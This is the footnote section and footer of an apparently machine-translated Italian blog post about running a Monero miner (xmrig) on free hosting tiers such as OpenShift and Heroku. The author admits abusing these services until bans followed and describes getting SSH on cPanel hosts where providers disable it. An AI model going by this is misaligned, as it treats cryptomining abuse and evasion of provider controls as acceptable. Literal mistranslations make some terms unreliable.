id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>anche se ciò infrangerebbe molti presupposti sulla privacy, sono sicuro che la maggior parte di essi si limita a sbirciare all'interno ogni volta che si verifica un problema incombente, ma questo è solo un problema per i runtime basati su container, mentre le VM sono praticamente scatole nere.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>il minatore integrato nel nodo monero ha lavorato per renderlo più compatibile con lo sfondo, ma la distribuzione di xmrig non è mai stata focalizzata sulla compatibilità con lo sfondo.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>alcuni pool offrono diverse difficoltà su diverse porte di connessione e tendono ad allineare la difficoltà del lavoro alle condivisioni presentate dal minatore, ma la granularità del proxy era ancora più conveniente, in quanto impedirebbe il pool<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> bloccare</a> (anche se non abbiamo mai cambiato piscina).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>non era felice quando la configurazione appariva improvvisamente e scompariva dal file system</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>Non parliamo di<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> protocollo strato</a> dal momento che dobbiamo solo occuparci di tutto ciò che è implementato in<em> entrambi</em> la piscina e il minatore...che di solito è il minimo indispensabile, e possibilmente con estensioni non standard.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>non esagerare mai :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Non ho esplorato cosa succede quando un processo carica funzionalità aggiuntive in fase di esecuzione, poiché il kernel cercherebbe l'indirizzo nel layout di memoria dell'eseguibile, che accederebbe al filesystem e potrebbe causare un arresto anomalo.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>I limiti sono arbitrari, il tempo della CPU è inferiore a un secondo, la memoria è inferiore a 128 M, le connessioni in uscita sono bloccate.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>con un po' di pazienza puoi anche eseguire un'istanza ssh completa su un ambiente bootstrap attorno allo spazio del tuo account cpanel,<em> privo di</em> avere accesso all'SSH integrato di cpanel che tende a essere disabilitato dai provider di hosting.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift è passato da un livello gratuito di 1 anno a 3 mesi a 1 mese, iniziando a richiedere l'autenticazione telefonica, posso garantire che non ero l'unico ad abusare dei loro servizi.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>I contenitori di livello gratuito di Heroku sono piuttosto generosi in termini di risorse, forniscono CPU 4c/8t (virtuali), molta RAM e ampio spazio di archiviazione (che tuttavia non è persistente e viene scartato all'arresto del banco prova).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Aggiungono regole di registrazione molto più rigide, dopo un paio di divieti, potrei aver contribuito.</table><p><div id=post-tags-list>Tag degli articoli: <span class=post-tag><a href=https://www.unto.re/tag/crypto> cripto</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> netto</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> guscio</a></span></div><div class=page-foot><div class=copyright>21 agosto 2021</div><script async crossorigin=anonymous issue-term=pathname label=Comment repo=untoreh/untoreh.github.io src=https://utteranc.es/client.js></script></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - Realizzato da<a href=https://github.com/tlienart/Franklin.jl> Franklin</a></div><div class=page__footer-links>- <ul><li><a href=/it/sitemapxml> Mappa del sito</a></li> | <li><a href=/it/tag> tag</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></footer></div><script crossorigin=anonymous defer id=fa integrity=sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH src=https://use.fontawesome.com/releases/v5.8.2/js/all.js></script><script src=/libs/colors.js></script><script src=/libs/menu.js></script><script defer src=/libs/lunr/lunr.min.js></script>